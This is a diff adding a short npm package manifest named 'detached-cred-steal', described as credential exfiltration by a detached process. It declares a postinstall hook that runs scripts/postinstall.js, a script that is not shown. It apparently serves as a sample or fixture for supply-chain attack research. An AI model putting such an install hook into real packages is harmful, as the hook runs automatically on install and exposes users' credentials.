@@ -1,0 +1,8 @@
+{
+  "name": "detached-cred-steal",
+  "version": "1.0.0",
+  "description": "Detached process credential exfiltration",
+  "scripts": {
+    "postinstall": "node scripts/postinstall.js"
+  }
+}
